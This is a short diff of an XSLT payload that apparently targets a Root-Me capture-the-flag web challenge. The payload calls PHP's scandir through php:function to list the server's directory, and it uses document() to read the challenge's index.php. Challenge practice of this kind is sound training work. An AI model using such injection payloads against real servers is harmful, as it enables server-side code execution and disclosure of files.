@@ -8,9 +8,7 @@
         
     	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
         
-        <xsl:template match="/">
-            Dir: <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
-        </xsl:template>
+        Dir: <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
         
     	File: <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>    
     </p>
